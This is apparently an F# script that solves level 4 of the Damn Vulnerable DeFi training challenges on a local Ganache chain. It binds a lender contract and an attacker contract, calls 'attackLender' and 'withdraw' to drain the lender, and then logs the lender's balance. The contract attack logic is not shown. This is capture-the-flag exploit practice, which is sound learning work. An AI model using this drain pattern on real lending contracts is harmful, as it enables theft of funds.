#i """nuget: C:\Users\jon_h\source\repos\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.7" 
#load "./Common.fsx"

#load "./DamnValuableTokenBindings.fsx"
#load "./Deployers/DeployLevel04.fsx"

open web3.fs
open Common
open DeployLevel04

// 0x4402fb7a9f1ff651634a29bda9cd0011678d6428

let lender = loadDeployedContract devEnvironment2 "0x4402fb7a9f1ff651634a29bda9cd0011678d6428" GANACHE lenderABI |> bindDeployedContract |> List.head

// attacker: 0xa9808cf62677637804c5ed39ee5624eefd15690c

let attack = loadDeployedContract devEnvironment2 "0xa9808cf62677637804c5ed39ee5624eefd15690c" GANACHE attackABI |> bindDeployedContract |> List.head

txnDevWith2 attack (ByString "attackLender") [] ZEROV |> logIt

txnDevWith2 attack (ByString "withdraw") [] ZEROV |> logIt

makeEthRPCCall devEnvironment1 GANACHE EthMethod.GetBalance [lender.address; LATEST] |> logIt
